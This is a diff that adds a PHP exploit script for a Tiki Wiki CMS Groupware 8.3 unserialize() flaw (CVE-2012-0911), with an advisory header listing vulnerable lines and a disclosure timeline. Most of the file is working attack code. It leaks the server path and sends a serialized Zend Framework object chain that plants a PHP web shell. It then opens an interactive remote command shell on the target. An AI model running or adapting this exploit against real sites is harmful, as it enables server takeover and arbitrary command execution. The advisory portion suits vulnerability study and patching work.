@@ -1,0 +1,162 @@
+<?php
+
+/*
+    -----------------------------------------------------------------
+    Tiki Wiki CMS Groupware <= 8.3 "unserialize()" PHP Code Execution
+    -----------------------------------------------------------------
+  
+    author...........: Egidio Romano aka EgiX
+    mail.............: n0b0d13s[at]gmail[dot]com
+    software link....: http://info.tiki.org/
+  
+    +-------------------------------------------------------------------------+
+    | This proof of concept code was written for educational purpose only.    |
+    | Use it at your own risk. Author will be not responsible for any damage. |
+    +-------------------------------------------------------------------------+
+    
+    [-] Vulnerable code in different locations:
+  
+    lib/banners/bannerlib.php:28:                   $views = unserialize($_COOKIE[$cookieName]);
+    lib/banners/bannerlib.php:136:                  $views = unserialize($_COOKIE[$cookieName]);
+    tiki-print_multi_pages.php:19:          $printpages = unserialize(urldecode($_REQUEST['printpages']));
+    tiki-print_multi_pages.php:24:          $printstructures = unserialize(urldecode($_REQUEST['printstructures']));
+    tiki-print_pages.php:31:        $printpages = unserialize(urldecode($_REQUEST["printpages"]));
+    tiki-print_pages.php:32:        $printstructures = unserialize(urldecode($_REQUEST['printstructures']));
+    tiki-send_objects.php:42:       $sendpages = unserialize(urldecode($_REQUEST['sendpages']));
+    tiki-send_objects.php:48:       $sendstructures = unserialize(urldecode($_REQUEST['sendstructures']));
+    tiki-send_objects.php:54:       $sendarticles = unserialize(urldecode($_REQUEST['sendarticles']));
+    
+    The vulnerability is caused due to all these scripts using "unserialize()" with user controlled input.
+    This can lead to execution of arbitrary PHP code passing an  ad-hoc Zend Framework serialized  object.
+
+    [-] Full path disclosure at:
+  
+    http://[host]/[path]/admin/include_calendar.php
+    http://[host]/[path]/tiki-rss_error.php
+    http://[host]/[path]/tiki-watershed_service.php
+  
+    [-] Disclosure timeline:
+  
+    [11/01/2012] - Vulnerability discovered
+    [14/01/2012] - Issue reported to security(at)tikiwiki.org
+    [14/01/2012] - New ticket opened: http://dev.tiki.org/item4109
+    [23/01/2012] - CVE number requested
+    [23/01/2012] - Assigned CVE-2012-0911
+    [01/05/2012] - Version 8.4 released: http://info.tiki.org/article191-Tiki-Releases-8-4
+    [04/07/2012] - Public disclosure 
+ 
+*/
+ 
+error_reporting(0);
+set_time_limit(0);
+ini_set("default_socket_timeout", 5);
+
+function http_send($host, $packet)
+{
+    if (!($sock = fsockopen($host, 80))) die("\n[-] No response from {$host}:80\n");
+    fputs($sock, $packet);
+    return stream_get_contents($sock);
+}
+
+function get_path()
+{
+    global $host, $path;
+    
+    $packet  = "GET {$path}tiki-rss_error.php HTTP/1.0\r\n";
+    $packet .= "Host: {$host}\r\n";
+    $packet .= "Connection: close\r\n\r\n";
+     
+    if (!preg_match('/in <b>(.*)tiki-rss/', http_send($host, $packet), $m)) die("\n[-] Path not found!\n");
+    return $m[1];
+}
+
+
+print "\n+----------------------------------------------------------------------+";
+print "\n| Tiki Wiki CMS Groupware <= 8.3 Remote Code Execution Exploit by EgiX |";
+print "\n+----------------------------------------------------------------------+\n";
+
+if ($argc < 3)
+{
+    print "\nUsage......: php $argv[0] <host> <path>\n";
+    print "\nExample....: php $argv[0] localhost /";
+    print "\nExample....: php $argv[0] localhost /tiki/\n";
+    die();
+}
+
+list($host, $path) = array($argv[1], $argv[2]);
+
+$f_path = get_path();
+print "\n[-] Path disclosure: {$f_path}\n";
+
+class Zend_Search_Lucene_Index_FieldInfo
+{
+    public $name = '<?php error_reporting(0); print(___); passthru(base64_decode($_SERVER[HTTP_CMD])); die; ?>';
+}
+
+class Zend_Search_Lucene_Storage_Directory_Filesystem
+{
+    protected $_dirPath = null;
+    
+    public function __construct($path)
+    {
+        $this->_dirPath = $path;
+    }
+}
+
+interface Zend_Pdf_ElementFactory_Interface {}
+
+class Zend_Search_Lucene_Index_SegmentWriter_StreamWriter implements Zend_Pdf_ElementFactory_Interface
+{
+    protected $_docCount = 1;
+    protected $_name = 'foo';
+    protected $_directory;
+    protected $_fields;
+    protected $_files;
+    
+    public function __construct($directory, $fields)
+    {
+        $this->_directory = $directory;
+        $this->_fields    = array($fields);
+        $this->_files     = new stdClass;
+    }
+}    
+
+class Zend_Pdf_ElementFactory_Proxy
+{
+    private $_factory;
+    
+    public function __construct(Zend_Pdf_ElementFactory_Interface $factory)
+    {
+        $this->_factory = $factory;
+    }
+}
+
+// http://www.suspekt.org/downloads/POC2009-ShockingNewsInPHPExploitation.pdf
+$directory = new Zend_Search_Lucene_Storage_Directory_Filesystem($f_path."sh.php\0");
+$__factory = new Zend_Search_Lucene_Index_SegmentWriter_StreamWriter($directory, new Zend_Search_Lucene_Index_FieldInfo);
+$____proxy = new Zend_Pdf_ElementFactory_Proxy($__factory);
+
+$payload = urlencode(serialize($____proxy));
+$payload = str_replace('%00', '%2500', $payload);
+$payload = "printpages={$payload}";
+
+$packet  = "POST {$path}tiki-print_multi_pages.php HTTP/1.0\r\n";
+$packet .= "Host: {$host}\r\n";
+$packet .= "Content-Length: ".strlen($payload)."\r\n";
+$packet .= "Content-Type: application/x-www-form-urlencoded\r\n";
+$packet .= "Connection: close\r\n\r\n{$payload}";
+
+if (preg_match('/multiprint/', http_send($host, $packet))) die("[-] Multi-print feature disabled!\n");
+
+$packet  = "GET {$path}sh.php HTTP/1.0\r\n";
+$packet .= "Host: {$host}\r\n";
+$packet .= "Cmd: %s\r\n";
+$packet .= "Connection: close\r\n\r\n";
+
+while(1)
+{
+    print "\ntiki-shell# ";
+    if (($cmd = trim(fgets(STDIN))) == "exit") break;
+    $response = http_send($host, sprintf($packet, base64_encode($cmd)));
+    preg_match('/___(.*)/s', $response, $m) ? print $m[1] : die("\n[-] Exploit failed!\n");
+}
